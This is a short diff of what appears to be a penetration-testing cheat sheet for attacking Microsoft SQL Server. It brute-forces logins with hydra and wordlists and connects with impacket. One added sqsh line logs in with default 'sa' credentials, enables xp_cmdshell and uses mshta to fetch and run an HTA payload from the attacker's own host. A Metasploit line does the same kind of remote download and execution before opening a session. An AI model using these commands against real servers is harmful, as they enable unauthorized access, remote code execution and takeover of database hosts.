@@ -418,8 +418,8 @@ cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefa
 
 hydra mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -t35
 
-msfconsole -q -x "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $TARGET; run;"
-msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGET; set USER_FILE /tmp/mssqlusernames; set PASS_FILE /tmp/mssqlpasswords; run;"
+impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
+sqsh -S $TARGET -U sa -P sa -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'mshta http://$MYIP:8080/Qp4ne2qq0oOb.hta';"
 msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
 sessions -i 1
 
